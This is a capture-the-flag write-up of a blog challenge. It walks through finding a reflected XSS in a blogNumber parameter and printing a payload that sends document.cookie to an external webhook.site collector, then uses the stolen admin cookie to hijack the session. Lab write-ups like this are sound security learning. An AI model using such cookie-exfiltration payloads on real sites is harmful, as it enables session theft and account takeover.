---
description: reflected XSS and session hijacking
---

# Bloggergate

The server seemed to be taking in a URL and the backend processes it. When I gave it a webhook link, it didn't process anything.

But going through the site, it was clear that I had to make server (admin) execute an HTTP request to my webhook and exfiltrate data there.

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

I then used burpsuite to put "curl \<site>" instead but the sserver didn't process anything again.

This means there is no RCE too.

This leaves me to two main choices for the server to execute HTTP request to webhook: SSTI and XSS

I tried SSTI but it didn't work. So, it was time to test XSS. I couldn't put it in the URL form. But I saw when I clicked on the existing blog posts, URL was accepting it's ID (number of blog) as GET parameter.

Observe how the blog number is reflected on the page!

<figure><img src="../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

Upon viewing the source code, I saw it being reflected in the HTML.

<figure><img src="../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

I tried to input HTML tags and run javascript on the server and it worked:

`http://site/blog?blogNumber=%3Cscript%3Edocument.write(document.cookie);%3C/script%3E`

<figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

Cool cool. Let's make a simple payload in Javascript that reaches our webhook

`http://18.225.156.202:9090/blog?blogNumber=2%22%3E%3Cimg%20src=x%20onerror=this.src=%27https://webhook.site/e20454b9-297d-47d2-bb93-9da689061414/?%27%2bdocument.cookie;%3E`

<figure><img src="../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

Now, request from my browser (my IP) was reaching webhook. This request was initiated by the JS code. When we submit this using the URL page, we'll have admin's cookie with us!

<figure><img src="../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

We hit it! And the thing is, blogging site on the server had an admin panel that we couldn't access.

<figure><img src="../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

Session Hijacking: By changing user's cookie to this new found cookie, let's see what happens

<figure><img src="../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

Upon submitting, we find the flag!

<figure><img src="../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

